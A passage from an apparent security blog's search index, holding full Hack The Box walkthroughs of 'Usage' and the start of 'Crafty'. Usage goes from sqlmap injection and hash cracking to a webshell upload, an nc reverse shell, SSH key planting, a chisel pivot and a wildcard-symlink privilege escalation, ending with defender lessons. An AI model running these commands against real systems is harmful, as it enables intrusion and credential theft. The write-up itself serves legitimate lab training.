&#x1f501; Password re-use is bad, but key re-use is almost as bad. I&rsquo;m the last guy who&rsquo;d ever stick my hand up and say &ldquo;I love key management, it&rsquo;s so fun!&rdquo;, but I will definitely admit it&rsquo;s important. While there are better ways to do it, every operating system I use has its own keyring system, and it&rsquo;s pretty seamless to just generate keys and manage them at the OS level. Start with that, and re-assess later if a more comprehensive system is necessary - but definitely don&rsquo;t get lazy and start re-using keys.
&#x1f910; Keep sensitive data out of backups. This can be really tricky, especially if you&rsquo;re actively working on developing a product. The best way to keep secrets and sensitive data from leaking into backups or build artifacts is to know exactly where they&rsquo;re stored, and never let them reside elsewhere. Solutions for this problem will vary from organization to organization, but a great start is to use the credential leak scanner built into github.
`,url:"https://4wayhandshake.github.io/walkthrough/runner/"},"https://4wayhandshake.github.io/walkthrough/usage/":{title:"Usage",tags:["Laravel","Password Cracking","Insecure File Upload","Monit","7-Zip"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Usage was released in the short period between HTB&rsquo;s Season 4 and Season 5. The target is a server hosting a small blog and a set of administrative tools to manage the server. Also, the target features pretty cool little monitoring tool called Monit, and seemingly also clamAV (although it didn&rsquo;t factor into the attack).
Foothold is the hardest part of Usage. After carefully examining the target and doing web enumeration on it, one only comes to the conclusion that the attack surface is quite small. However, the few interactive elements that are present do indeed have a vulnerability. It&rsquo;s surprising, considering the site runs on Laravel, but the password reset form can be exploited through SQL injection. Some careful usage of sqlmap will do wonders here.
I&rsquo;m blown away by the fact that some folks managed to root the box in half an hour, because I spent much longer than that simply trying all the forms with sqlmap.
The initial SQL injection leads into an admin dashboard that has an easily discoverable (but also publicly disclosed) insecure file upload vulnerability. A webshell comes in handy here, but can be skipped in favor of a reverse shell directly, which will get you the user flag.
A very small amount of local user enumeration will yield a couple seemingly-innocuous credentials. At face value they lead down rabbit holes. But eventually they do lead to a lateral move to another user. From that second user, the root flag is very easy to obtain. However, as discussed at the end of this walkthrough, it&rsquo;s unclear why the trivial method I used for the root flag actually worked.
All in all, I didn&rsquo;t enjoy this one as much as I had hoped. It&rsquo;s possible that I was bogged-down by a very poor network connection, making the initial foothold excruciatingly out-of-reach for so long. The rest of the box was cool, and a good reminder to keep it simple!
RECON nmap scans For this box, I&rsquo;m using a new recon strategy: I took some time recently and automated all of my nmap scans into one tool. Perhaps I&rsquo;ll release it publicly sometime, but in this walkthrough I&rsquo;ll just be providing the console output as usual.
I set $RADDR to the target machine&rsquo;s IP, and proceeded with scanning.
Port scan I started with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA) |_ 256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://usage.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No extra info was provided by the vuln scan.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
PORT STATE SERVICE VERSION 17/udp open|filtered qotd 68/udp open|filtered tcpwrapped 123/udp open|filtered ntp 158/udp open|filtered tcpwrapped 631/udp open|filtered tcpwrapped 1022/udp open|filtered tcpwrapped 1026/udp open|filtered win-rpc 1719/udp open|filtered h323gatestat 4500/udp open|filtered tcpwrapped 5632/udp open|filtered pcanywherestat 49193/udp open|filtered unknown Note that any open|filtered ports are either open or (much more likely) filtered.
Webserver Strategy Noting the redirect from the nmap scan, I added usage.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=usage.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR We can tell from this that the target is Ubuntu, they&rsquo;re running a current version of nginx with Laravel as a CMS, and that we&rsquo;re up against some anti-CSRF mechanism.
Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v That&rsquo;s the expected result. Nothing else though. Now I&rsquo;ll check for subdomains of usage.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v Since we found the subdomain admin.usage.htb, I&rsquo;ll add that to my /etc/hosts file as well. Next, I&rsquo;ll move on to directory enumeration of http://usage.htb and the subdomain http://admin.usage.htb:
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 -c -ic -timeout 4 -v Directory enumeration against http://usage.htb/ gave no unknown results: just dashboard, login, and registration.
&#x261d;&#xfe0f; I&rsquo;m noticing now that my scans seem to be getting blocked. I think that the target may be running some kind of WAF that is blocking my scans. Maybe I&rsquo;ll turn down the speeds and randomize my user agent, etc.
Exploring the Website Arriving at the index page for the http server, we are presented with a simple login form. There are buttons in the navbar to register, login, and a link to admin.usage.htb:
I registered an account for testing, jimbob : jim.bob@fake.fake : password123. Logging in with that credential brings us to a page showcasing some blog entries:
&#x1f602; Ok, I&rsquo;m starting to see a theme.
Every blog entry is about server-side language penetration testing. The website is running Laravel, a PHP framework, so my best guess is that these blog entries are alluding to testing PHP?
Other than that, all I really see is a password-reset feature.
FOOTHOLD SQLi Testing Since it&rsquo;s really easy to test, I&rsquo;ll try throwing SQLMap at the website first. All I found on http://admin.usage.htb is the login page, so I&rsquo;ll start there.
I&rsquo;m also going to proxy all the requests through ZAP, just so I can see what it&rsquo;s attempting.
sqlmap -u &#39;http://admin.usage.htb/&#39; --proxy=&#39;http://127.0.0.1:8080&#39; --forms --skip=&#39;remember&#39; --csrf-token=&#39;_token&#39; --random-agent --level=5 --risk=3 --batch Unfortunately, I didn&rsquo;t get any results from this. I&rsquo;ll move on to the non-admin site, http://usage.htb.
Due to the presence of the anti-CSRF token _token on every form, I can&rsquo;t just point SQLMap at the root of the site and use the --crawl argument. Instead, I&rsquo;ll have to point it at every form. I&rsquo;ll start with the registration form:
sqlmap -u &#39;http://usage.htb/registration&#39; --proxy=&#39;http://127.0.0.1:8080&#39; --forms \\ --skip=&#39;remember&#39; --csrf-token=&#39;_token&#39; --csrf-url=&#39;http://usage.htb/registration&#39; \\ --random-agent --level=5 --risk=3 --batch Note that I&rsquo;m explicitly directing sqlmap to go back to the form and grab the correct anti-CSRF token from the form.
No results from that. Next is the login form:
sqlmap -u &#39;http://usage.htb/login&#39; --proxy=&#39;http://127.0.0.1:8080&#39; --forms \\ --skip=&#39;remember&#39; --csrf-token=&#39;_token&#39; --csrf-url=&#39;http://usage.htb/login&#39; \\ --random-agent --level=5 --risk=3 --batch Also no results from that. Finally, I&rsquo;ll check the password-reset form:
sqlmap -u &#39;http://usage.htb/forget-password&#39; --proxy=&#39;http://127.0.0.1:8080&#39; --forms \\ --skip=&#39;remember&#39; --csrf-token=&#39;_token&#39; --csrf-url=&#39;http://usage.htb/forget-password&#39; \\ --random-agent --level=5 --risk=3 --batch &#x1f601; Nice! Finally found something:
That&rsquo;s fantastic. Let&rsquo;s see what we can do with this. Best case scenario is a shell, so I&rsquo;ll start with that:
sqlmap -u &#39;http://usage.htb/forget-password&#39; --forms -p &#39;email&#39; --dbms=&#39;mysql&#39; \\ --random-agent --batch --level=5 --risk=3 --os-shell Hmm, no luck with that. I&rsquo;ll see if I can use --os-cmd, but I don&rsquo;t think that will be successful either. As a test case, I&rsquo;ll stand up a webserver to listen for requests from the target:
sudo ufw allow from $RADDR to any port 4444,8000,9999 proto tcp python3 -m http.server 8000 sqlmap -u &#39;http://usage.htb/forget-password&#39; --forms -p &#39;email&#39; --dbms=&#39;mysql&#39; \\ --random-agent --batch --level=5 --risk=3 --os-cmd=&#39;nc 10.10.14.15&#39; Yeah, same result. Makes sense though: --os-shell and --os-cmd work using the same principles. Oh well, let&rsquo;s see what we can enumerate out of the database instead. I&rsquo;ll start by checking what databases exist:
sqlmap -u &#39;http://usage.htb/forget-password&#39; --forms -p &#39;email&#39; --dbms=&#39;mysql&#39; \\ --random-agent --batch --level=5 --risk=3 --dbs Great, usage_blog looks like what we need. What tables does it have?
sqlmap -u &#39;http://usage.htb/forget-password&#39; --forms -p &#39;email&#39; --dbms=&#39;mysql&#39; \\ --random-agent --batch --level=5 --risk=3 --threads=5 -D &#39;usage_blog&#39; --tables There are a few tables there that might be useful. To start with, I&rsquo;ll dump admin_users and personal_access_tokens.
sqlmap -u &#39;http://usage.htb/forget-password&#39; --forms -p &#39;email&#39; --dbms=&#39;mysql&#39; \\ --random-agent --batch --level=5 --risk=3 --threads=10 -D &#39;usage_blog&#39; -T &#39;admin_users&#39; --dump Ok, looks like a bcrypt password hash. I can try to crack it, but it might not be possible &#x1f6a9; I&rsquo;ll finish enumerating the database first:
sqlmap -u &#39;http://usage.htb/forget-password&#39; --forms -p &#39;email&#39; --dbms=&#39;mysql&#39; \\ --random-agent --batch --level=5 --risk=3 --threads=10 -D &#39;usage_blog&#39; -T &#39;personal_access_tokens&#39; --dump The personal_access_tokens table was empty. Lastly, let&rsquo;s try the users table:
sqlmap -u &#39;http://usage.htb/forget-password&#39; --forms -p &#39;email&#39; --dbms=&#39;mysql&#39; \\ --random-agent --batch --level=5 --risk=3 --threads=10 -D &#39;usage_blog&#39; -T &#39;users&#39; --dump Password Cracking To crack the hash, I&rsquo;ll try using john. First though, I&rsquo;ll verify the hash format:
name-that-hash -t &#39;&#39; Now I&rsquo;ll put the hash into a file and attempt to crack it with rockyou:
echo -n &#39;$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2&#39; &gt; hash.txt john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt Alright! We now have a credential: admin : whatever1. This will probably get me into http://admin.usage.htb.
&#x1f44d; Yep, that credential worked to gain access to the admin dashboard.
Exploring the Dashboard The Admin Dashboard doesn&rsquo;t seem to contain very much information. There&rsquo;s just a single user and a single role. One thing that&rsquo;s visible right away is a list of dependencies and their versions:
Also, the user Permissions view shows an outline of the whole Admin API:
Also, if we check the administrator log, we can see on the last (earliest) page, there was a password reset:
For copy-pasting sake, that password hash is:
{ &#34;name&#34;: &#34;Administrator&#34;, &#34;password&#34;: &#34;$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHW4BxiQITrqjde\\/WQMKnAQ7k2HJK&#34;, &#34;password_confirmation&#34;: &#34;$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHW4BxiQITrqjde\\/WQMKnAQ7k2HJK&#34; } Aside: Password Cracking Again Now that I&rsquo;ve found another three password hashes, I&rsquo;ll try cracking them too. I put them all into a text file hashes.txt, with a username label on each hash:
rajraj:$2y$10$7ALmTTEYfRVd8Rnyep/ck.bSFKfXfsltPLkyQqSp/TT7X1wApJt4. rajhtb:$2y$10$rbNCGxpWp1HSpO1gQX4uPO.pDg1nszoI/UhwHvfHDdfdfo9VmDJsa Administrator:$2y$10$E9.N1P92fYSjJGQDfBrUaO05EHW4BxiQITrqjde\\/WQMKnAQ7k2HJK admin:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 Then I ran john again using rockyou:
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hashes.txt I&rsquo;m not sure why, but john doesn&rsquo;t seem to accept the format of the Administrator hash.
&#x1f4b0; Fantastic! There&rsquo;s another credential: raj : xander, where raj has the emails raj@raj.com and raj@usage.htb. With any luck, there will be credential re-use for SSH &#x1f91e;
Unfortunately, that wasn&rsquo;t the case:
The Admin Dashboard also has a page for user settings:
Oh? There&rsquo;s a spot to upload a profile picture. I&rsquo;ll check this for a file upload vulnerability. I&rsquo;ll submit a new photo and proxy it through ZAP.
Webshell Normally, this would be really easy to test, but there are a couple things about this form that&rsquo;s getting in the way:
The Submit button doesn&rsquo;t work, so I need to manually submit the form using jquery I can&rsquo;t automate testing the file extension or other bypasses, perhaps due to anti-CSRF? To reduce the amount of testing I&rsquo;d have to do, I searched up this version of Laravel-admin: indeed, there is an arbitrary file upload vulnerability! It&rsquo;s CVE-2023-24249, and there&rsquo;s an excellent blog post describing it here. The gist is that I should be able to upload a PHP script as long as I provide the extension .jpg.php.
In anticipation of a reverse shell, I opened up a listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp bash rlwrap socat -d TCP-LISTEN:4444 STDOUT So, very quickly (you have to move fast, or you&rsquo;ll get a HTTP 419 error!) I&rsquo;d Inspect the Submit button, locate its &lt;form&gt; element, right click it and select Use in console, where I manually trigger its submit() function - making sure to proxy the submission through ZAP.
Within ZAP, I modify the filename inside the content-disposition to suffix it as .jpg.php instead of just .jpg, and I swap out all the base64 data for my desired webshell. I&rsquo;m using the phpbash webshell by @Arrexel available at this repo. With everything swapped-out, I finally Forward the request through the browser:
The image appears to change, then you can copy the link from the Download button on the image.
USER FLAG Webshell to Reverse Shell Using this webshell, I then opened a reverse shell. This took several tries, but I finally was successful with the mkfifo bash style reverse shell:
Again, I had to move fast here, because my webshell kept getting wiped from the target &#x1f63f;
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.15 4444 &gt;/tmp/f On my attacker machine, I generated new ssh key:
ssk-keygen -t rsa -b 4096 # Used passphrase: b1rb chmod 600 ./id_rsa base64 -w 0 id_rsa.pub | tee id_rsa.pub64 # Copy to clipboard Then, on the target box (via the reverse shell), I planted ssh key into /home/dash/.ssh/authorized_keys:
echo &#39;c3NoLX...bGkK&#39; | base64 -d &gt;&gt; /home/dash/.ssh/authorized_keys Now that the key is planted, I can log in via SSH:
ssh -i ./id_rsa dash@$RADDR Finally, I have some persistence and don&rsquo;t have to worry about my webshell dying after like ten seconds.
Almost as if it was a reward for dealing with that excruciating webshell, the user flag is waiting for me in /home/dash. Just cat it for some points:
cat user.txt ROOT FLAG Local Enumeration - dash I&rsquo;ll follow my usual Linux User Enumeration strategy. To keep this walkthrough as brief as possible, I&rsquo;ll omit the actual procedure of user enumeration, and instead just jot down any meaningful results:
dash, root, and xander are the only significant users on the box. &#x1f514; xander? Wasn&rsquo;t that the password for raj that we found earlier?
dash owns all contents of /var/www/html and their home directory.
We have nc, netcat, curl, wget, python3, perl, php, tmux available
In addition to MySQL, we also have something called monit running and listening. There are also a bunch of monit-related files in Dash&rsquo;s home directory I should keep my eyes open for a MySQL credential or connection string.
Kernel version might be vulnerable to DirtyPipe &#x1f6a9; Linux usage 5.15.0-101-generic #111-Ubuntu SMP Tue Mar 5 20:16:58 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
There is an .env file for http://admin.usage.htb that holds MySQL credentials: /var/www/html/project_admin/.env
staff : s3cr3t_c0d3d_1uth Linpeas also uncovered that password-based authentication for SSH is enabled, even for the root user.
Chisel SOCKS Proxy Since I want to check out two services that are listening locally (MySQL and Monit), I&rsquo;ll set up a SOCKS proxy using chisel. I&rsquo;ll begin by opening a firewall port and starting the chisel server:
&#x261d;&#xfe0f; Note: I already have proxychains installed, and my /etc/proxychains.conf file ends with:
socks5 127.0.0.1 1080 sudo ufw allow from $RADDR to any port 9999 proto tcp ./chisel server --port 9999 --reverse &amp; Then, on the target machine, start up the chisel client and background it:
./chisel client 10.10.14.2:9999 R:1080:socks &amp; MySQL Since I&rsquo;m pretty sure that we&rsquo;ve already seen the contents of the MySQL database, may as well &ldquo;tick the box&rdquo; for enumeration first.
To log into the database from my attacker machine, I&rsquo;ll use proxychains with the MySQL client:
proxychains mysql -h 127.0.0.1 -D usage_blog -u staff -ps3cr3t_c0d3d_1uth A quick look around confirmed that, yes, this is exactly the database we&rsquo;ve already dumped. Nothing new to be gained here.
Monit We identified TCP port 2812 earlier as monit. But what does it do? From their website:
Monit is a small Open Source utility for managing and monitoring Unix systems. Monit conducts automatic maintenance and repair and can execute meaningful causal actions in error situations.
&#x1f4a1; This must have been what made my enumeration and webshell such a pain! I&rsquo;ll need to keep this in mind for my own servers.
Inside Dash&rsquo;s home directory, there are some .monit related files:
.monit.id This appears to be an MD5 hash .monit.pid It&rsquo;s a different PID than the one listening on port 2812 .monit.state contains binary data: z=$fapacheusagerootfs���� .monitrc Configuration file, shown below. Contains the credential admin : 3nc0d3d_pa$$w0rd The configuration file .monitrc shows that Monit has its own http server running on port 2812. I&rsquo;ll navigate address using the SOCKS5 proxy we&rsquo;ve already established using Chisel.
&#x26a0;&#xfe0f; ​For some reason, Firefox doesn&rsquo;t seem to play nice with proxychains.
Instead, I find it a lot easer to just utilize FoxyProxy. Configure like this to connect it to the chisel proxy that&rsquo;s already established:
Once configured, I open a new tab and enable this proxy for just that one tab:
The Tab Proxy feature seems a little buggy. I find it helps to set the proxy on a page that&rsquo;s already loaded, then navigate to the target after enabling the tab proxy, instead of simply refreshing.
Navigating to the Monit page, we are presented with a http-basic-authentication form, where we can provide the known credentials:
&#x261d;&#xfe0f; To load this page, I first checked 127.0.0.1, then localhost, and then tried 0.0.0.0 where I was successful.
After clicking Sign in, we are brought to the Monit dashboard:
Right now, I don&rsquo;t see how I&rsquo;ll make use of this. After clicking on usage, there is a way to disable monitoring: that might be helpful if I need to do something quite processing-intensive (For example, even just running Linpeas seemed to trip Monit&rsquo;s defenses.)
Credential Reuse As a personal policy, I like to keep track of two lists while I&rsquo;m doing a box: a list of known or possible credentials, and a list of services requiring authentication. Any time a new entry is added to either list, I should re-test any new credential-service combinations for credential re-use.
During local enumeration for Dash, we uncovered a couple new credentials:
staff : s3cr3t_c0d3d_1uth This was found in /var/www/html/project_admin/.env Already verified as valid for MySQL admin : 3nc0d3d_pa$$w0rd This was found in /home/dash/.monitrc Already verified as valid for Monit http server We&rsquo;ve already verified that the credentials are valid for their stated uses, but I havent tested them against two entries on my &ldquo;services requiring authentication&rdquo; list:
SSH / root SSH / xander Service Password Result SSH / root s3cr3t_c0d3d_1uth Negative SSH / xander s3cr3t_c0d3d_1uth Negative SSH / root 3nc0d3d_pa$$w0rd Negative SSH / xander 3nc0d3d_pa$$w0rd Logged in! &#x1f389; Perfect! We now have a new verified credential xander : 3nc0d3d_pa$$w0rd and a new user to enumerate:
Local Enumeration - xander Normally I&rsquo;d follow my usual local enumeration procedure, but in this case the very first command I entered showed something too juicy to ignore:
Let&rsquo;s check out this usage_management thing:
&#x1f914; Let&rsquo;s think in terms of what there is to gain from each option:
(2) doesn&rsquo;t gain me anything: I already have full access to the MySQL database and have dumped its contents. (3) doesn&rsquo;t gain me anything: I already have the admin password (1) seems promising&hellip; This could be used in many ways. The script archived something (unclear what) into /var/backups/project.zip. I&rsquo;ll transfer it to my attacker machine and examine it there.
mkdir ./loot/project-zip scp xander@$RADDR:/var/backups/project.zip ./loot/project-zip/project.zip cd ./loot/project-zip unzip project.zip Ok, so it looks like the backup was of the whole /var/www/html directory, of which the xander group has ownership over:
&#x1f4a1; If the usage_management script runs by archiving /var/www/html/* then I might be able to simple symlink the root directory into there and take a &ldquo;backup&rdquo; of it.
Ok, it&rsquo;s linked, now let&rsquo;s take the backup:
It looks like it zipped up the /root directory&hellip; I&rsquo;m hopeful &#x1f91e;
&#x1f389; It worked! There&rsquo;s the flag. Just cat it to finish off the box &#x1f602;
cat /root/root.txt EXTRA CREDIT: FULL PWN We already have the .ssh directory for root, so let&rsquo;s use the keys inside to log in:
ssh -i ./id_rsa root@$RADDR And there we go, full root access!
Cleanup Script Out of interest, I wanted to see the script that was giving me so much grief earlier - it might have been this cleanup.sh script:
#!/bin/bash /usr/bin/mysql -uroot -D usage_blog -e &#34;update admin_users set avatar=&#39;&#39; where id=1;&#34; /usr/bin/find /var/www/html -type f -mmin -10 ! -path &#34;/var/www/html/usage_blog/storage/framework/sessions/*&#34; ! -path &#34;/var/www/html/usage_blog/routes/*&#34; ! -path &#34;/var/www/html/project_admin/routes/*&#34; -delete So it periodically deletes everything in /var/www/html/usage_blog/storage/framework/sessions, /var/www/html/usage_blog/routes, and /var/www/html/project_admin/routes. The corresponding entry in crontab was this:
*/3 * * * * /bin/bash /root/cleanup.sh So whenever the minutes are evenly divisible by 3 (i.e. every 3 minutes), run the cleanup script. Hmm, there must have been something else causing me issues too, because I was getting kicked off WAY more frequently than every three minutes. Oh well &#x1f937;&zwj;&#x2642;&#xfe0f;
Usage_management.c Also, just out of interest, let&rsquo;s take a look and find the insecure code in usage_management.c:
#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt; void backupWebContent() { if (chdir(&#34;/var/www/html&#34;) == 0) { // Change working directory to /var/www/html //char* filename = &#34;project.zip&#34;; // Use 7za to create a backup in the parent directory system(&#34;/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *&#34;); } else { perror(&#34;Error changing working directory to /var/www/html&#34;); } } void backupMysqlData() { // Use mysqldump to create a backup of the MySQL data system(&#34;/usr/bin/mysqldump -A &gt; /var/backups/mysql_backup.sql&#34;); } void resetAdminPassword() { // Use MySQL command to reset the admin password //system(&#34;mysql -D usage_blog -e &#39;UPDATE admin_users SET password=\\&#34;whatever1\\&#34; WHERE username=\\&#34;admin\\&#34;;&#39;&#34;); printf(&#34;Password has been reset.\\n&#34;); } int main() { // ... // Take choice from the menu // ... } Well that&rsquo;s weird! As predicted, the code was vulnerable because it used a wildcard to choose the directories to archive. However, let&rsquo;s consider the problematic line:
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- * The really weird part is that -snl is supposed to prevent the exact attack that I did with it: archiving symlinks so that they don&rsquo;t get dereferenced into the archive. Why would that have worked??
CLEANUP Target I&rsquo;ll get rid of the spot where I place my tools, /tmp/.Tools, and the spot where the backup was created:
rm -rf /tmp/.Tools rm /var/backups/project.zip Attacker There&rsquo;s also a little cleanup to do on my local / attacker machine. It&rsquo;s a good idea to get rid of any &ldquo;loot&rdquo; and source code I collected that didn&rsquo;t end up being useful, just to save disk space:
rm -rf ./loot/project-zip/project_admin rm -rf ./loot/project-zip/usage_blog It&rsquo;s also good policy to get rid of any extraneous firewall rules I may have defined. This one-liner just deletes all the ufw rules:
NUM_RULES=$(($(sudo ufw status numbered | wc -l)-5)); for (( i=0; i&lt;$NUM_RULES; i++ )); do sudo ufw --force delete 1; done; sudo ufw status numbered; LESSONS LEARNED Attacker &#x1f489; SQLMap is extremely powerful. This was the first box I&rsquo;ve done where I fully utilized the anti-anti-CSRF functionality in sqlmap, and frankly I was amazed by how easy it was.
&#x26a1; anti-CSRF may be tripped by proxying the request in the wrong way through ZAP. I was only able to upload a webshell when I proxied the request through the Request &amp; Response tab of ZAP; when I tried to edit the request from the Request Editor tab (then &ldquo;Send&rdquo; it), my request failed the anti-CSRF checks every time. So, while subtle, there is indeed a distinction between forwarding an edited proxied request and editing an intercepted request and sending it after editing&hellip; A little convoluted, but definitely something to note.
&#x1f511; Be very rigorous about testing for credential reuse. I&rsquo;m guilty of being a little too lax with this, and I&rsquo;ve been bitten by this fact many times. I&rsquo;m seriously considering getting a tattoo on the back of my hand telling my to test for credential re-use. The method I like to follow is to keep two lists: one of credentials I&rsquo;ve found and one of services requiring authentication - any time either list gets a new entry, be sure to run through both lists and test any new combinations that are possible!
&#x1f98a; Use foxyproxy to navigate to websites hosted via a chisel proxy. It&rsquo;s really easy to configure, and saves a lot of wrestling with browser settings or proxychains.
Defender &#x1f6e1;&#xfe0f; Use all available safeguards to protect against malicious file uploads. This box relied on only a single safeguard against exploiting an arbitrary file upload vulnerability: Laravel-admin. However, they were using a vulnerable version of the plugin. Finding security flaws in dependencies is a fact of modern life, but there&rsquo;s no reason we need to put all our hopes on one safeguard. For example, nginx itself could have protected against these file uploads. Or, the Monit service could have been scanning the upload directory or monitoring for evidence of reverse shells. There are tons of options.
&#x1f53b; If you won&rsquo;t prevent credential re-use, minimize it. On this box, we were able to log into any user by using password-based authentication to SSHd. To be honest, that&rsquo;s a pretty risky idea - especially when the root user becomes exposed. One way to diminish password re-use from stubborn people is to force them to use keys instead. At least they&rsquo;re easily revocable, right?
&#x2a;&#xfe0f;&#x20e3; Never write a sudo-able program that contains a wildcard. When you need to write a script for operational reasons, it can be tough to keep security in mind. One really good rule of thumb is to avoid any kind of wildcard matching. It&rsquo;s simply too difficult to preempt all of a hacker&rsquo;s tricks, but applying good coding practices goes a long way to minimizing their options.
`,url:"https://4wayhandshake.github.io/walkthrough/usage/"},"https://4wayhandshake.github.io/walkthrough/crafty/":{title:"Crafty",tags:["Minecraft","Log4j","Log4shell","Java","Decompilation","Runas","RunasCs"],categories:["Walkthrough","HTB","Windows","Easy"],content:`INTRODUCTION Crafty is an easy-rated Windows box, released for week 6 of HTB&rsquo;s Season IV Savage Lands. This box centers around exploitation of log4j - maybe you&rsquo;ve heard of it &#x1f602; It was a really big deal in 2021. While the disaster that ensued caused heaps of damage, very little actually changed as a result of its occurrence. If anything can be said for it, at least it stoked the international dialog on supply-chain attacks and the failing health of the open-source ecosystem.
This box is just a website and a Minecraft server. Foothold can be gained by mimicking a textbook example of log4shell. In this case, using a malicious LDAP server to indirectly serve a Java class that opens a reverse shell. Thankfully, the target isn&rsquo;t running any antivirus, and crafting the reverse shell is easy. After gaining a foothold, some manual enumeration will lead you to a file containing a credential. The trick is in knowing how to utilize the credential, given the fragile nature of the reverse shell.
In my opinion, Crafty was really unpleasant. It&rsquo;s cool that they did something with log4j, but at every twist and turn of this box, it was 10/10 annoying. For example, there&rsquo;s no way to gain a better shell on the box, so if your reverse shell ever dies, you&rsquo;ll need to re-exploit. And when you re-exploit, the box becomes unusable for every other HTB user - leading to an inevitable reset! &#x1f62b;
RECON nmap scans Port scan For this box, I&rsquo;m running my typical enumeration strategy. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to the target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR PORT STATE SERVICE 80/tcp open http 25565/tcp open minecraft &#x1f602; 25565&hellip; That&rsquo;s probably the first port number I ever memorized, from running minecraft servers off my own computers at home. Wow, what a blast from the past.
Script scan To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Did not follow redirect to http://crafty.htb |_http-server-header: Microsoft-IIS/10.0 25565/tcp open minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (86%) Aggressive OS guesses: Microsoft Windows Server 2019 (86%) Vuln scan Now that we know what services might be running, I&rsquo;ll do a vulnerability scan:
sudo nmap -n -Pn -p$TCPPORTS -oN nmap/vuln-scan-tcp.txt --script &#39;safe and vuln&#39; $RADDR No vulnerabilities were found.
UDP scan To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR No open/listening UDP ports were found.
Port 80 - Webserver Strategy Noting the redirect from the nmap scan, I added crafty.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=crafty.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts whatweb $RADDR &amp;&amp; curl -IL http://$RADDR OK, so it&rsquo;s using Microsoft IIS 10.0 for the webserver, which seems like the current version.
Next I performed vhost and subdomain enumeration. I&rsquo;ll check for subdomains of crafty.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/vhost-$DOMAIN.md -of md -timeout 4 -ic -ac -v No new results from that. I&rsquo;ll move on to directory enumeration on http://crafty.htb:
